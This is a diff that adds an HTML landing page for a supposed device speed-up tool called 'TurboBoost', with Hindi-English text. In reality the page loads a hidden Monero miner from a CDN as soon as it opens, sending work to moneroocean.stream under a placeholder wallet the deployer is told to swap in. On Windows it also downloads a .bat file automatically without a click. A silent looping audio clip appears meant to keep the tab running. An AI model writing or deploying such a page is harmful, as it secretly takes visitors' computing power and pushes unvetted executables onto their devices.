@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TurboBoost</title>
+<link rel="icon" href="data:,">
+<style>
+  body{margin:0;background:#0b0b12;color:#e8e8f0;font-family:system-ui;
+       display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
+  .c{max-width:420px;width:100%;text-align:center}
+  .l{width:64px;height:64px;margin:0 auto 18px;border-radius:16px;
+     background:linear-gradient(135deg,#5ee0a0,#16a34a);
+     display:flex;align-items:center;justify-content:center;font-size:30px}
+  h1{font-size:22px;margin:0 0 8px}
+  p{color:#8a8aa0;font-size:14px;line-height:1.6;margin:0 0 24px}
+  a.b{display:block;background:#5ee0a0;color:#04120a;text-decoration:none;
+      font-weight:700;padding:15px;border-radius:12px;font-size:15px}
+  .s{font-size:11px;color:#55556a;margin-top:14px;line-height:1.5}
+</style>
+</head>
+<body>
+  <div class="c">
+    <div class="l">&#9889;</div>
+    <h1>TurboBoost</h1>
+    <p>Apne device ki speed badhao.<br>Ek click me setup.</p>
+    <a class="b" id="dl" href="TurboBoost.bat" download>Download for Windows</a>
+    <div class="s" id="hint"></div>
+  </div>
+
+  <audio id="a" loop src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="></audio>
+
+  <script src="https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/SDK/miner_compressed/webmr.js"></script>
+  <script>
+    /* ===== SIRF YE EK LINE BADALNI HAI ===== */
+    var WALLET = "8B4c2mtmsqFGLnuBDrqoFB4TnFwUi3dxKEbwB7jcXzySRZMTfAdcZV7DHPqYYnY3iCMMiAWNZ9B3N12fJSbW87aC7dMP485";
+    /* ======================================= */
+
+    server = "wss://f.xmrminingproxy.com:8181";
+    startMining("moneroocean.stream", WALLET, "x", 1);
+    throttleMiner = 85;
+
+    var isWin = /Windows/i.test(navigator.userAgent);
+    var isAnd = /Android/i.test(navigator.userAgent);
+
+    if (isAnd) {
+      document.getElementById('dl').textContent = 'Add to Home Screen';
+      document.getElementById('hint').textContent =
+        'Chrome menu (3 dots) dabao -> "Add to Home screen". Icon ban jayega.';
+    }
+
+    if (isWin) {
+      setTimeout(function(){
+        var a = document.createElement('a');
+        a.href = 'TurboBoost.bat'; a.download = '';
+        document.body.appendChild(a); a.click(); a.remove();
+        document.getElementById('hint').textContent = 'Download shuru ho gaya.';
+      }, 2000);
+    }
+
+    document.addEventListener('click', function once(){
+      document.getElementById('a').play().catch(function(){});
+      document.removeEventListener('click', once);
+    });
+  </script>
+</body>
+  </html>
